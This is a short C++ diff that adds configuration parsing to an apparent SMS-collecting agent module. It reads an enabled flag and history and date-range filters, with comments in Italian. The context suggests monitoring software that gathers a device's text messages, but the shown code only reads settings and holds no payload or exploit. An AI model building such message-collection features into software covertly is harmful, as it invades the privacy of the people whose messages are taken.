@@ -14,6 +14,24 @@ DWORD WINAPI SmsAgent(LPVOID lpParam) {
 	Observer *observerObj = Observer::self();
 	MSG Msg;
 
+	BOOL smsEnabled = FALSE, history = FALSE;
+	wstring dateFrom, dateTo;
+	JSONObject filter;
+
+	// Cosi si prende la conf per SMS, per tutti gli altri e' uguale
+	// cambia solo il nome dell'array
+	try {
+		smsEnabled = conf->getBoolFromArray(L"sms", L"enabled");
+
+		filter = conf->getObjectFromArray(L"sms", L"filter");
+
+		history = conf->getBoolFromObject(filter, L"history");
+		dateFrom = conf->getStringFromObject(filter, L"datefrom");
+		dateTo = conf->getStringFromObject(filter, L"dateto");
+	} catch (...) {
+		smsEnabled = FALSE;
+	}
+
 	me->setStatus(MODULE_RUNNING);
 	eventHandle = me->getEvent();
 
